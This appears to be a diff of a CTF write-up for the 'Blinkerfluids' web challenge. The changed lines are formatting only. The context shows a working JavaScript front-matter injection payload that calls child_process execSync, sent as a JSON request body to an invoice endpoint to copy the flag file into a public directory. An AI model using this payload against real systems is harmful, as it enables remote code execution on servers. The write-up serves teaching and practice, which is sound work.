@@ -3,7 +3,7 @@ layout: default
 title: Blinkerfluids
 ---
 
-# Blinkerfluids
+# [Cyber Apocalypse](../index.md) - Web - Blinkerfluids
 
 *I did not have the foresight to save screenshots or the challenge description while the CTF was active*.
 
@@ -14,7 +14,7 @@ We are given a copy of the source code, so the first thing I do is explore that.
 The web app is a docker container that runs a `node.js` based javascript web app.
 
 The `Dockerfile` tells us that the flag can be found at /flag.txt:
-```
+```Dockerfile
 # Add flag
 COPY flag.txt /flag.txt
 ```
@@ -58,13 +58,13 @@ The proof of concept code for this exploit tells me that if I give it the follow
 ---jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))n---RCE
 ```
 So, I used [Insomnia](https://insomnia.rest) to send the following request body directly to `http://challenge-ip-and-port/api/invoice/add`. I had to replace the double-quotes with single-quotes, from the proof of concept code.
-```
+```json
 {
     "markdown_content" : "---jsn((require('child_process')).execSync('cat /flag > static/invoices/flag.txt'))n---RCE"
 }
 ```
 And response I got back was:
-```
+```json
 {
     "message" : "Invoice saved successfully!"
 }
